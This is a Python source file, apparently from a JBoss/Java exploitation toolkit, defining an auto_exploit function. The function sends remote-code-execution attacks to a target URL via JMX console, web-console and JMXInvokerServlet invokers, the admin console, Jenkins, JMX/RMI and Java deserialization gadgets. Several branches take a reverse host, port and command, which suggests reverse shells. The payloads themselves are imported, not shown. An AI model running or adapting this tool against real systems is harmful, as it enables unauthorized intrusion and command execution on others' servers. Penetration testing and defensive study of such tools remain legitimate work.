import logging

from src.core.config import Config
from src.exploits.admin_console import exploit_admin_console
from src.exploits.app_deser import exploit_application_deserialization
from src.exploits.jenkins import exploit_jenkins
from src.exploits.jmx_console import exploit_jmx_console_file_repository, exploit_jmx_console_main_deploy
from src.exploits.jmx_invoker import exploit_jmx_invoker_file_repository
from src.exploits.jrmi import exploit_jrmi
from src.exploits.jx3 import get_host_port_reverse_params
from src.exploits.servlet_deser import exploit_servlet_deserialization
from src.exploits.web_console import exploit_web_console_invoker
from src.utils.colors import Colors
from src.utils.misc import print_and_flush


def auto_exploit(url: str, exploit_type: str, cfg: Config, http_pool) -> bool:
    """
    Automatically exploit a target URL without interactive prompts.
    :param url: Target URL
    :param exploit_type: Exploit vector name
    :param cfg: Config instance containing parameters like cmd, reverse_host, etc.
    :param http_pool: HTTP connection pool instance
    :return: True if exploit was initiated, False otherwise
    """
    # Initial banner
    print_and_flush(Colors.GREEN + f"\n * Sending exploit code to {url} via {exploit_type}. Please wait...\n")
    result = 505

    if exploit_type == "jmx-console":
        result = exploit_jmx_console_file_repository(url)
        if result not in (200, 500):
            result = exploit_jmx_console_main_deploy(url)

    elif exploit_type == "web-console":
        if url.endswith("/web-console/Invoker") or url.endswith("/web-console/Invoker/"):
            url = url.replace("/web-console/Invoker", "")
        result = exploit_web_console_invoker(url)
        if result == 404:
            host, port = get_host_port_reverse_params(cfg)
            if not host or not port or not cfg.cmd:
                print_and_flush(Colors.RED + f" * Missing reverse_host or cmd for {exploit_type}." + Colors.ENDC)
                return False
            result = exploit_servlet_deserialization(
                url + "/web-console/Invoker", host=host, port=port,
                cmd=cfg.cmd, is_win=cfg.windows,
                gadget=cfg.gadget, gadget_file=cfg.load_gadget
            )

    elif exploit_type == "JMXInvokerServlet":
        if url.endswith("/invoker/JMXInvokerServlet") or url.endswith("/invoker/JMXInvokerServlet/"):
            url = url.replace("/invoker/JMXInvokerServlet", "")
        result = exploit_jmx_invoker_file_repository(url, version=0)
        if result not in (200, 500):
            result = exploit_jmx_invoker_file_repository(url, version=1)
        if result == 404:
            host, port = get_host_port_reverse_params(cfg)
            if not host or not port or not cfg.cmd:
                print_and_flush(Colors.RED + f" * Missing reverse_host or cmd for {exploit_type}." + Colors.ENDC)
                return False
            result = exploit_servlet_deserialization(
                url + "/invoker/JMXInvokerServlet", host=host, port=port,
                cmd=cfg.cmd, is_win=cfg.windows,
                gadget=cfg.gadget, gadget_file=cfg.load_gadget
            )

    elif exploit_type == "admin-console":
        result = exploit_admin_console(url, cfg.jboss_login)

    elif exploit_type == "Jenkins":
        host, port = get_host_port_reverse_params(cfg)
        if not host or not port or not cfg.cmd:
            print_and_flush(Colors.RED + f" * Missing reverse_host or cmd for {exploit_type}." + Colors.ENDC)
            return False
        result = exploit_jenkins(
            url, host=host, port=port,
            cmd=cfg.cmd, is_win=cfg.windows,
            gadget=cfg.gadget, show_payload=cfg.show_payload
        )

    elif exploit_type == "JMX Tomcat":
        host, port = get_host_port_reverse_params(cfg)
        if not host or not port:
            print_and_flush(Colors.RED + f" * Missing reverse_host for {exploit_type}." + Colors.ENDC)
            return False
        result = exploit_jrmi(url, host=host, port=port, cmd=cfg.cmd, is_win=cfg.windows)

    elif exploit_type == "Application Deserialization":
        host, port = get_host_port_reverse_params(cfg)
        if not host or not port:
            print_and_flush(Colors.RED + f" * Missing reverse_host for {exploit_type}." + Colors.ENDC)
            return False
        result = exploit_application_deserialization(
            url, host=host, port=port, cmd=cfg.cmd, is_win=cfg.windows,
            param=cfg.post_parameter, force=cfg.force,
            gadget_type=cfg.gadget, show_payload=cfg.show_payload,
            gadget_file=cfg.load_gadget
        )

    elif exploit_type == "Servlet Deserialization":
        host, port = get_host_port_reverse_params(cfg)
        if not host or not port:
            print_and_flush(Colors.RED + f" * Missing reverse_host for {exploit_type}." + Colors.ENDC)
            return False
        result = exploit_servlet_deserialization(
            url, host=host, port=port, cmd=cfg.cmd, is_win=cfg.windows,
            gadget=cfg.gadget, gadget_file=cfg.load_gadget
        )

    elif exploit_type == "Struts2":
        result = 200

    # Final result handling
    if result in (200, 201, 500):
        print_and_flush(Colors.GREEN + f" * Exploit via {exploit_type} initiated successfully." + Colors.ENDC)
        return True
    else:
        print_and_flush(Colors.RED + f" * Exploitation via {exploit_type} failed. HTTP Code: {result}" + Colors.ENDC)
        logging.error(f"Auto exploit error for {url} via {exploit_type}. HTTP Code: {result}")
        return False
